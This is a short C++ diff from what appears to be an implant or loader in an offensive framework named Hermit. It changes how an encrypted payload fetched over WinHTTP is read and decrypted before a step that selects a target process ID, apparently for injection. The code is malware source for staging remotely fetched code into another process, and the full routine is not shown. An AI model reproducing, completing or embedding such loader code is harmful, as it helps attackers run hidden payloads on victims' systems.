@@ -184,15 +184,16 @@ namespace Hermit
 
         hRequest = resp.hRequest;
 
-        std::vector<BYTE> encBytes = System::Http::ReadResponseBytes(pProcs, hRequest);
-        if (encBytes.size() == 0)
+        // std::vector<BYTE> encBytes = System::Http::ReadResponseBytes(pProcs, hRequest);
+        std::wstring wEnc = System::Http::ReadResponseText(pProcs, hRequest);
+        if (wEnc.length() == 0)
         {
             Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
             return;
         }
 
         // Decrypt the data
-        std::vector<BYTE> bytes = Crypt::DecryptData(Utils::Convert::VecByteToString(encBytes));
+        std::vector<BYTE> bytes = Crypt::Decrypt(wEnc);
 
         // Target PID
         DWORD dwPID;
